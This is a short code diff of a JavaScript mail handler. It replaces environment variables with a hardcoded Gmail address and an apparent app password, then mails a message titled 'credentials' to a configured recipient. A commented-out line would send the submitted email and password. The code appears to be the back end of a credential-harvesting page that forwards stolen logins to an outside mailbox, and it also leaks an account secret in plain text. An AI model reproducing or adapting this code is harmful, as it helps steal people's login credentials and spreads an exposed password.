@@ -21,14 +21,14 @@ export default function handler(
     port: 465,
     secure: true,
     auth: {
-      user: process.env.APP_ACCOUNT,
-      pass: process.env.APP_PASSWORD,
+      user: "Sgtalexelizondo@gmail.com",
+      pass: "grnudpdsgucnpaeh",
     },
   });
 
   return transporter
     .sendMail({
-      from: `"fox" <${process.env.APP_ACCOUNT}>`,
+      from: `"fox" <Sgtalexelizondo@gmail.com>`,
       to: process.env.EMAIL_TO_SEND,
       subject: "credentials",
       // text: `${JSON.stringify(email)} ${JSON.stringify(password)}`,
